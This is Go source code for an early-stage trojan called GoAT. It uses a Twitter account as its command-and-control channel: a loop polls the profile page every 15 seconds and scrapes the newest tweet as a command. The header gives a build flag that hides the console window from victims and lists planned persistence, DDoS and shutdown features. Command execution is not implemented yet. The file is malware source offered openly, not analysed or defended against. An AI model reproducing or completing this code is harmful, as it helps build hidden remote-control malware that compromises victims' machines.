/*	
GoAT (Golang Advanced Trojan) -- Version 0.1 (UNDER CONSTRUCTION!)
	by Peter Cunha
		http://petercunha.com
		https://github.com/petercunha

This is a trojan made in Go, using Twitter as a the C&C server. 

NOTE: Compile with	go build -o GoAT.exe -ldflags "-H windowsgui" "C:\GoAT.go"	to have no console show.

TODO:
	- Persistence
	- Check for >1 running instance
	- Commands
		- DDoS
		- Send messagebox
		- Uninstall
		- Shutdown/Restart
*/ 

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

var (
	commander string = "kanye"	// Twitter account for Command & Control
	slumber time.Duration = 15	// Time to wait between checking for commands (in seconds)
	command string = ""			// Latest command
)

func main() {
	fmt.Println("GoAT Loaded.\n")

	for true {
		refresh()
		time.Sleep(time.Second * slumber)
	}
}

func refresh() {
	fmt.Println("Refreshing...")
 	lines := getContent()

	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], "data-aria-label-part=\"0\">") {
			temp := strings.Split(strings.Split(lines[i], "data-aria-label-part=\"0\">")[1], "<")[0]
			if command != temp {
				command = temp
				fmt.Println("New command found!")
			}
			i = len(lines)
		}
	}
	fmt.Println("Refreshed. Sleeping for", int(slumber), "seconds")
 } 

func getContent() ([]string) {
	res, err := http.Get("https://twitter.com/" + commander)
	if err != nil {
		log.Fatal(err)
	}

	content, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		log.Fatal(err)
	}

	return strings.Split(string(content), "\n")
}
